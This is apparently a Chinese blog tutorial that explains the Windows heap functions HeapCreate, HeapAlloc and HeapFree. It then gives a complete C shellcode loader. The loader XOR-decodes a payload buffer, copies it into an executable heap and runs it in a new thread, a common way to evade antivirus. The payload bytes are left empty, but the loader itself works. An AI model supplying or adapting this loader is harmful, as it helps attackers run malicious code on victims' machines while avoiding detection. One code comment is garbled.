前言

在计算机中一直有堆栈的概念，这两者是有区别的。栈区是一段连续的内存空间，由系统分配；而堆则是人为申请的空间，需要我们指定其大小。

之前的文章都是用VirtualAlloc函数来申请虚拟内存，今天的话利用创建堆的方式获取内存空间。

正题

HeapCreate

HeapCreate 函数创建一个可供调用进程使用的堆对象。该函数在进程的虚拟地址空间中保留空间，并为此块的指定初始部分分配物理存储。

HANDLE HeapCreate(
  DWORD flOptions,       // 指定新堆的可选属性
  SIZE_T dwInitialSize,  // 初始化堆大小
  SIZE_T dwMaximumSize   // 最大堆大小
);

flOptions：
    HEAP_CREATE_ENABLE_EXECUTE 0x00040000 允许堆可被执行
    
    HEAP_GENERATE_EXCEPTIONS 0x00000004 系统引发异常以指示调用 HeapAlloc 和 HeapReAlloc 失败（例如，内存不足的情况），而不是返回 NULL。
    
    HEAP_NO_SERIALIZE 0x00000001 当堆函数访问此堆时，不使用序列化访问。 此选项适用于所有后续堆函数调用。 或者，您可以在单个堆函数调用上指定此选项。
    
    HEAP_ZERO_MEMORY 0x00000008 初始化堆栈用0填充
HeapAlloc

HeapAlloc 函数从堆中分配一块内存。分配的内存不可移动。

LPVOID HeapAlloc(
  HANDLE hHeap,   // 指定将分配内存的堆
  DWORD dwFlags,  // 指定堆分配的几个可控方面
  SIZE_T dwBytes  // 指定要分配的字节数
);
HeapFree

HeapFree 函数释放由 HeapAlloc 或 HeapReAlloc 函数从堆中分配的内存块。

BOOL HeapFree(
  HANDLE hHeap,  // 指定函数释放其内存块的堆
  DWORD dwFlags, // 指定释放内存块的几个可控方面
  LPVOID lpMem   // 指向要释放的内存块的指针
);

因为有些函数在前面的文章已经介绍过了，这里就不在赘述了，对于有些参数里面的各个标志，还是需要自己查阅MSDN去了解的。

#include <Windows.h>

int main() {
    LPDWORD lpThreadId = 0;
// 1. 异或后的代码
unsigned char buf[] = "";
    // 异或的key
unsigned int key = 45;
for (int i = 0; i < sizeof(buf); i++) {
buf[i] ^= key;
}
// 2. 申请堆空间
HANDLE hHeap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, sizeof(buf), 0);
LPVOID hHeapMemory = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(buf));
// 3. 把shellcode 写入堆空间
RtlCopyMemory(hHeapMemory, buf, sizeof(buf)); 
// 4. 创建线程的方式调用shellcode
HANDLE hThread = CreateThread(
NULL,
NULL,
(LPTHREAD_START_ROUTINE)hHeapMemory,
NULL,
NULL,
lpThreadId
);
WaitForSingleObject(hThread, INFINITE);
    // 关闭疾病
CloseHandle(hThread);
    // 释放堆空间
HeapFree(hHeap, HEAP_NO_SERIALIZE, hHeapMemory);
return 0;
}
